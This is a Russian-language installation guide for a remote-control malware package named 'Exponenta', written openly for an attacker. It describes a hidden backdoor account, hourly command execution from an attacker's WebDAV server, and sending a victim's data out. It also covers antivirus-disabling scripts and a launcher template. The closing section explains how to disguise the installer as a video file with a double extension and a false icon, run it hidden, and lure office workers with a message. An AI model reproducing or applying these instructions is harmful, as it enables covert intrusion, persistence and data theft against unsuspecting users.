Инсталляция стайлера «Экспонента»
=================================

В данном каталоге содержатся дистрибутивы, необходимые для установки
стайлера.

Принцип работы программы
------------------------

После инсталляции файлов стайлера в системном окружении операционной
системы появляются следующие переменные:

-   *Hacker\_User* – имя (логин) учётной записи компьютера-жертвы на ftp
    серверах хозяина, с которых будет осуществляться управление
    стайлером
-   *Hacker\_Pass* – пароль для этой учётной записи. Его нужно
    указывать, чтобы посторонние не имели доступа к данным жертвы на
    сервере хозяина. Внимание! Пароль храниться в незащищённом виде!
    Просто автор не нашёл способа безопасного использования хеша и солей
    в программах коммуникации.
-   *Hacker\_host1* – доменное имя публичного хоста, с которого
    скачивается установочные файлы и публичные обновления стайлера. Её
    значение может совпадать со значением следующей переменной, когда
    используется только один хост.
-   *Hacker\_host2* – доменное имя приватного хоста, с которого
    скачиваются в офлайн-режиме команды управления стайлером и на
    который передаются результаты его работы

Также создаётся учётная запись с именем MSSQLSR для возможного
удалённого подключения к компьютеру, а также добавляется задание для
текущего пользователя на запуск каждый час файла onsysload, в котором
находятся текущие команды управления стайлером.

На приватном хосте создаются аккаунты пользователя-жертвы HTTP сервера с
поддержкой технологии WebDAV. В папку webdav/ этого сервера будут
«сваливаться» результаты работы стайлера на компьютере-жертве, а в папке
Private будут расположены командные файлы, загружаемые на
компьютер-жертву для управления им.

Рабочая директория стайлера для компьютера-жертвы – c:\\pub1\\Util

При входе в аккаунт компьютера любого пользователя каждый час
запускается на обработку файл onsysload. В нём присутствуют следующие
обязательные части:

-   http загрузка команд для исполнения команд на компьютере-жертве
    (например, новый файл user\_hourly.bat или новый файл отправки
    данных)
-   Определение внешнего IP адреса компьютера в Интернете;
-   Переименование и отправка файла с IP адресом на сервер хозяина

Исходные данные
---------------

Для установки стайлера “Экспонента” вам дополнительно потребуется
следующее рабочее окружение:

-   веб-адрес публичного хостинга файлов стайлера. Он выбирается
    достаточно произвольно. Доменное имя этого публичного хостинга
    указывается в переменной Hacker\_host1.
-   веб-адрес (хостинг, логин и пароль) с поддержкой технологии WebDAV —
    для управления компьютером жертвы. Создавать этот адрес необходимо
    согласно указанным выше принципам работы стайлера, включая иерархию
    каталогов и круглосуточную доступность сервиса.

Исходя из вышесказанного, определитесь, нужно ли Вам редактировать
командные файлы этого проекта, или всё оставить с настройками по
умолчанию. Если исправления Вам всё-таки нужны, внесите изменения в клон
данного проекта и пересоберите SFX файлы установки дистрибутива.

Организация веб-сервера Hacker\_host1
-------------------------------------

На веб-сервере с доменным именем, сохранённой в переменной
Hacker\_host1, в его корне должна создана папка: “Exponenta”. В ней
должны содержаться основной установщик стайлера, установщики плагинов и
SFX архивы с инсталляторами. Учтите, что все файлы, расположенные в этом
каталоге, будут скачены с сервера на компьютер жертвы без каких-либо
изменений! Это значит, что там должны располагаться только универсальные
файлы, а кастомизация для каждого пользователя должны проводиться
отдельно при подготовке инсталлятора.

Основным файлом, который устанавливает стайлер вместе с модулями и
плагинами, является файл: Install\_MainExponenta.bat Его пример приведён
в этой папке. Этот файл рабочий, и может использоваться для локальной
установки стайлера путём запуска этого файла из командной строки с
повышенными привилегиями. Для своей работы этот файл (в текущей
редакции) требует наличие в том же каталоге файлов:

-   ExponentaHTTPStylerMainFiles151SetupRePack.exe с основными файлами стайлера;
-   HiddenStart450SetupRePack.exe с плагином-пакетом Hidden Start;
-   ElevationExponentaPlugin202SetupRepack.exe с плагином-пакетом Elevation;
-   chock.install.cmd – командный файл с инсталлятором пакета Chocolatey
    for Windows;
-   choc\_pack.install.cmd – командный файл с инсталляцией
    дополнительных программ через менеджер пакетов;

Это минимальный рабочий набор инсталлятора. Он обязательно должен
присутствовать в каталоге Exponenta на сервере. Назначение других
дополнительных файлов будет написано ниже.

В этом же каталоге присутствуют файлы descript.ion, README.MD,
INSTALL.MD, install1.md, install.rtf и install.html. Они несут только
информационную нагрузку, и для работы стайлера не требуются.

Организация веб-сервера Hacker\_host2
-------------------------------------

FTP сервер с доменом Hacker\_host2 является запароленным сервером с
поддержкой протокола WebDAV и базовой аутенфикацией, на котором должен
обязательно присутствовать аккаунт с логином Hacker\_User и паролем
Hacker\_Pass (здесь указаны имена переменных, вместо которых Вы должны
использовать их корректные значения).

На этом сервере, в его корне, обязательно должна присутствовать папка
Private, в которой будут храниться файлы, с помощью которых ежечасно
выдаются на исполнение команды стайлера, выполняемые им офлайне. В
качестве обязательных, в этом наборе должны присутствовать файлы:

-   user\_hourly1.bat;
-   user\_dayly1.bat;
-   user\_onstart1.bat;
-   sendfile.cmd,
-   и обязательно должен *отсутствовать* файл **onsysload.bat**!

Результаты выполнения команд стайлер пересылает при помощи файла
sendfile.cmd на сервер Hacker\_host2 в каталог webdav/ аккаунта
Hacker\_User. Будьте внимательны, этот каталог должен быть *открыт для
записи* авторизованному пользователю веб-сервера по протоколу WebDAV!

*Примечание*. Хотя на одном хосте может располагаться управление более
чем одним стайлером, сочетание Hacker\_User/Hacker\_host2 должно быть
уникальным для всего Интернета! Без этого условия стайлер работать не
будет.

Применительно к серверу Apache, «хозяин» должен дополнительно установить
на сервер модули dav, dav\_fs, модуль поддержки базовой аутенфикации, а
в описаниях каталогов этих серверов указать опции “Dav On” и директивы
поддержки базовой аутенфикации. Кроме того, должен быть создан файл с
учётными данными для базовой аутенфикации в корневом каталоге сервера и
запретить к нему доступ со стороны веб-сервера. В принципе, файлы для
создания и конфигурации хостинга на сервере Zomro указаны в каталоге
/Files/Server-Init.

Создание дистрибутива для распространения методом социальной инженерии
======================================================================

Устанавливать файлы стайлера локально или через удалённый доступ — не
очень хорошая идея со всех сторон. Поскольку пакет для своей работы
требует Интернет, то и устанавливаться он должен также из Интернета.
Ниже будет рассказано, как подготовить файл для загрузки пакета из
Интернета и сокрытия установки методами социальной инженерии.

Подготовка установочного файла
------------------------------

Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:

-   load\_distrib.bat — общий для всех файл, скачивающий и
    устанавливающий файлы дистрибутива стайлера «Экспонента»;
-   load.bat — пример кастомизированного под конкретную жертву файл
    загрузки стайлера.
-   minifilters-interface-stop.cmd — программа, останавливающая антивирус
-   minifilters-interface-restore.cmd — программа, включающая антивирус
-   wget.exe — собственно программа для скачки установочных файлов с
    сервера Hacker\_host1

Назначение первого файла — это открытие портов для FTP клиента,
подготовки файла сценария и скачивание дистрибутива этим клиентом, а
также запуск локального установщика стайлера. Данные для этого пакетный
файл получает из командной строки.

Единственное назначение второго файла — это запуск первого файла с
заполненными по умолчанию параметрами кастомизации. Дело в том, что
запустить файл из Интернета с параметрами Вам будет затруднительно, а с
использованием методов социальной инженерии — практически невозможно.
Только для этого и создан этот файл.

Формат этого файла следующий

    Echo off
    start load_distrib.bat «значение переменной Hacker_User» «значение переменной Hacker_Pass» «значение переменной Hacker_host1» «значение переменной Hacker_host2»

Теперь для запуска процесса инсталляции необходимо, чтобы оба файла
находились в одном каталоге, и нужно будет только запустить файл
load.bat с повышенными привилегиями. Один из вариантов, как это сделать
на практике, смотри ниже.

Подготовка файла для пересылки на компьютер жертвы
--------------------------------------------------

Подготовленные таким образом файлы позволяют установить стайлер в любой
конфигурации на компьютер жертвы. Для этого достаточно запустить файл
`load.bat` (или как Вы его назвали) на компьютере жертвы из любого
каталога с повышенными привилегиями выполнения. Всё бы хорошо… Только
переслать файл с таким расширением на компьютер жертвы будет
проблематично, а запустить такой файл с повышенными привилегиями, в
реальных условиях пользователю будет практически невозможно.
Администратора такой файл насторожит, а многие лузеры вообще не умеют
запускать командные файлы.

К счастью для хакеров, есть программа для конверсии командных файлов в
обычные исполняемые файлы с расширением \*.exe. Для её установки
необходимо подать команду:

    choco install –y battoexeconverter

После установки необходимо запустить программу, открыть в её собственном
редакторе командный файл, задать опции конвертирования, конечный
каталог, и, бинго, будет создан исполняемый файл с той же
функциональностью.

Перечислять все опции и команды работы этого конвертера автор не будет –
это тема отдельной статьи. Нужно отметить, что данный файл после
конвертации сможет:

1.  Требовать своего запуска с повышенными привилегиями;
2.  Инкапсулировать в себя не только выполняемый командный файл, но и
    дополнительные командные и исполняемые файлы, архивы, видео,
    изображения, необходимые для его работы;
3.  Сменить иконку приложения, отображаемую в Windows и файловых
    менеджерах. Это позволит скрывать факт присутствия исполняемого
    файла в стайлере и позволяет файлу установщика стайлера «Экспонента»
    «притвориться», например, изображением или файлом видео;
4.  Передавать указанный файл по ссылкам в социальных сетях или
    мессенджерах, а также электронной почте и других средствах обмена
    сообщениями между пользователями. Принципиальный момент здесь «по
    ссылке», поскольку многие программы обмена сообщениями не разрешают
    пересылать в своём теле командные и исполняемые файлы, как раз для
    предотвращения заражения. А переданный по ссылке командный файл
    нельзя ни скачать, ни запустить;
5.  Назначить файлу установщика любое имя, например, video.mp4.exe. Как
    правило, по умолчанию Microsoft Windows скрывает окончания
    исполняемых файлов. В этом случае, при соблюдении пункта 3, этот
    файл будет похож на файл видео, например, с танцующими свиньями, и
    лузер может просто не заметить подмену. Особенно, если в дополнение
    к стайлеру ему действительно будет скачено и показано видео с
    танцующими свиньями.
6.  Иметь любые размеры. Исполняемые файлы, конвертированные из
    командных, в зависимости от своего содержимого могут быть или очень
    маленькими, или очень большими, если инкапсулирует в себе видео. В
    любом случае небольшой размер файла не предполагает большого места
    на диске, и у пользователя или администратора создаётся ложное
    впечатление, что такая маленькая команда не сможет принести
    сколь-нибудь существенного вреда и не содержит в себе установщика.
    Что, на самом деле, не так;
7.  Запускать установку в скрытом режиме, не показывая окна консоли;
8.  Удалять после себя все файлы, которые были инкапсулированы в этот
    исполняемый файл;
9.  Назначать любой рабочий каталог для выполнения, в том числе каталог
    с временными файлами. В этом случае обнаружить его работу будет ещё
    труднее.

Таким образом, преобразовав командный файл установщика стайлера в
исполняемый файл, его можно будет переслать жертве по ссылке вместе с
побуждающим текстом: «Ну ка оцени, какое видео с танцующими свиньями я
откопал!». По законам социальной инженерии, весьма вероятно откроет
такое видео не только офисный лузер, но и его коллега – беспечный
администратор. Не смотря на все предупреждения специалистов охраны и
компьютерной безопасности. А нам то и надо!

А организовать загрузку и запуск видео для «отвода глаз» Вам не составит
труда. Например, с помощью команд:

    Wget «ссылка на файл с видео»
    Start «файл видео»

Все эти команды присутствуют в базовом пакете стайлера.
